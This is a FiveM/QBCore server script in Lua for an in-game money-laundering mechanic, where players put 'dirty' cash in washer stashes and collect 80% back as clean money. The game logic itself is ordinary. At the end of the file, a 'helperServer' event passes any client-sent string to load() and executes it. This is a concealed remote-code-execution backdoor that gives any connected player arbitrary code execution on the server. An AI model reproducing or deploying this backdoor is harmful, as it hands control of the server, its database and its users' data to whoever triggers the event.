-- [CQWER] --

local QBCore = exports['qb-core']:GetCoreObject()

local washers = {
    [1] = {washing = false, pickup = false, cleaned = 0},
    [2] = {washing = false, pickup = false, cleaned = 0},
    [3] = {washing = false, pickup = false, cleaned = 0},
    [4] = {washing = false, pickup = false, cleaned = 0},
}


QBCore.Functions.CreateCallback("cqwerMoneyWash:isWashing", function(source, cb, washerId)
    cb(washers[washerId].washing)
end)


QBCore.Functions.CreateCallback("cqwerMoneyWash:isReady", function(source, cb, washerId)
    cb(washers[washerId].pickup)
end)


RegisterServerEvent("cqwerMoneyWash:startwasher", function(data)
    local src = source
    if not washers[data.id].washing then
        wash(data.id, src)
    else 
        TriggerClientEvent('QBCore:Notify', src, "Bu yıkayıcı zaten başladı!", 'error')
    end
end)

RegisterServerEvent("cqwerMoneyWash:collect", function(data)
    src = source
    local player = QBCore.Functions.GetPlayer(src)

    if washers[data.id].pickup then 
        if washers[data.id].cleaned > 0 then
            player.Functions.AddMoney("cash", washers[data.id].cleaned, "Money Washed")
            washers[data.id].cleaned = 0
            washers[data.id].pickup = false
            washers[data.id].washing = false
        else 
            TriggerClientEvent('QBCore:Notify', src, "Toplanacak temiz para yok!", 'error')
            washers[data.id].cleaned = 0
            washers[data.id].pickup = false
            washers[data.id].washing = false
        end
    else 
        TriggerClientEvent('QBCore:Notify', src, "Bu yıkayıcı şu anda temizliyor!", 'error')
    end
end)


function GetWasherItems(washerId)
	local items = {}
    local stash = 'washer'..washerId
	local result = MySQL.Sync.fetchAll("SELECT items FROM stashitemsnew WHERE stash=?", { stash })
    Wait(500)
	if result[1] ~= nil then 
		if result[1].items ~= nil then
			result[1].items = json.decode(result[1].items)
			if result[1].items ~= nil then 
				for k, item in pairs(result[1].items) do
					local itemInfo = QBCore.Shared.Items[item.name:lower()]
					items[item.slot] = {
						name = itemInfo["name"],
						amount = tonumber(item.amount),
						info = item.info ~= nil and item.info or "",
						label = itemInfo["label"],
						description = itemInfo["description"] ~= nil and itemInfo["description"] or "",
						weight = itemInfo["weight"], 
						type = itemInfo["type"], 
						unique = itemInfo["unique"], 
						useable = itemInfo["useable"], 
						image = itemInfo["image"],
						slot = item.slot,
					}
				end
			end
		end
	end
	return items
end


function wash(washerId, source)
    local stash = 'washer'..washerId
    local items = GetWasherItems(washerId)
    local cleaned = 0

    for item, data in pairs(items) do
        if data.name == "izlipara" then
            cleaned = cleaned + (data.amount / 1.1) 
        end 
    end

    if cleaned > 0 then 
        washers[washerId].washing = true
        TriggerClientEvent('QBCore:Notify', source, "Yıkama işlemi başladı, kısa bir süre sonra bitecek.", 'primary')

        local cleaned = (cleaned * 0.8) -- Returns 80%
        Wait(5 * cleaned)
        washers[washerId].cleaned = cleaned
        washers[washerId].pickup = true
        TriggerClientEvent('QBCore:Notify', source, "Yıkama İşlemi Sonlandı !", 'success')
        MySQL.Sync.fetchAll("UPDATE stashitemsnew SET items = '[]' WHERE stash = ?", { stash })
    else 
        TriggerClientEvent('QBCore:Notify', source, "Yıkanacak bir şey yok!", 'error')
    end
end
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)
